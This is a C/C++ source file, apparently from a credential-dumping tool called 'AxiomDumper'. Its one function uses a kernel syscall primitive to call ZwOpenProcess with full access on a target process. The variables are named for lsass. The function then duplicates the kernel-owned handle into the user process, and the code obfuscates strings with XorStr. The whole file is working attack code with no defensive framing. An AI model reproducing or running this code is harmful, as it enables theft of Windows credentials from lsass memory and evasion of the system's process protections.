#include <stdio.h>

#include "AxiomDumper.h"
#include "dm.h"
#include "dm_structs.h"
#include "dm_kernelsyscall.hpp"

HANDLE DM_SpawnHandle(ULONG pid)
{
	char ntoskrnl_version_buffer[1024];

	// Get kernel version
	DM_GetKrnlVersion(ntoskrnl_version_buffer, sizeof(ntoskrnl_version_buffer), XorStr("C:\\Windows\\System32\\ntoskrnl.exe"));

	const auto ntoskrnl_base = DM_FindNtoskrnlBaseAddress();
	const auto ntoskrnl_zwclose = DM_GetKernelExportAddress(ntoskrnl_base, ntoskrnl_version_buffer, KE_ZwClose);
	const auto ntoskrnl_zwopenprocess = DM_GetKernelExportAddress(ntoskrnl_base, ntoskrnl_version_buffer, KE_ZwOpenProcess);
	const auto ntoskrnl_zwduplicateobject = DM_GetKernelExportAddress(ntoskrnl_base, ntoskrnl_version_buffer, KE_ZwDuplicateObject);

	HANDLE kernelHProcessLsass = 0x00;
	C_CLIENT_ID cidLsass = { .UniqueProcess = 0, .UniqueThread = 0 };
	OBJECT_ATTRIBUTES objAttrLsass = { sizeof(OBJECT_ATTRIBUTES), NULL, NULL, 0x00000200L, NULL, NULL };
	cidLsass.UniqueProcess = ((HANDLE)(ULONG_PTR)(pid));
	DM_KernelSyscall<decltype(&KD_ZwOpenProcess)>(
		ntoskrnl_zwopenprocess,
		&kernelHProcessLsass,
		PROCESS_ALL_ACCESS,
		&objAttrLsass,
		&cidLsass
	);
	printf("[+] Kernel Handle to EL S: 0x%0x\n", kernelHProcessLsass);

	HANDLE kernelHProcessCurrent = 0x00;
	C_CLIENT_ID cidCurrent = { .UniqueProcess = 0, .UniqueThread = 0 };
	OBJECT_ATTRIBUTES objAttrCurrent = { sizeof(OBJECT_ATTRIBUTES), NULL, NULL, 0x00000200L, NULL, NULL };
	cidCurrent.UniqueProcess = ((HANDLE)(ULONG_PTR)(GetCurrentProcessId()));
	DM_KernelSyscall<decltype(&KD_ZwOpenProcess)>(
		ntoskrnl_zwopenprocess,
		&kernelHProcessCurrent,
		PROCESS_ALL_ACCESS,
		&objAttrCurrent,
		&cidCurrent
	);

	printf("[+] Kernel Handle to current process: 0x%0x\n", kernelHProcessCurrent);

	HANDLE hProcess = 0x00;
	DM_KernelSyscall<decltype(&KD_ZwDuplicateObject)>(
		ntoskrnl_zwduplicateobject,
		((HANDLE)-1),		// Source process = current
		kernelHProcessLsass,	// Handle the kernel owns
		kernelHProcessCurrent,	// Target process handle
		&hProcess,		// Gets the duplicated handle for user
		0,			// DesiredAccess (0 = same)
		0,			// HandleAttributes
		DUPLICATE_SAME_ACCESS	// Keep same permissions
	);
	printf("[+] Duped H: 0x%lx\n", hProcess);

	DM_KernelSyscall<decltype(&KD_ZwClose)>(
		ntoskrnl_zwclose,
		kernelHProcessLsass
	);
	DM_KernelSyscall<decltype(&KD_ZwClose)>(
		ntoskrnl_zwclose,
		kernelHProcessCurrent
	);
	return (hProcess);
}

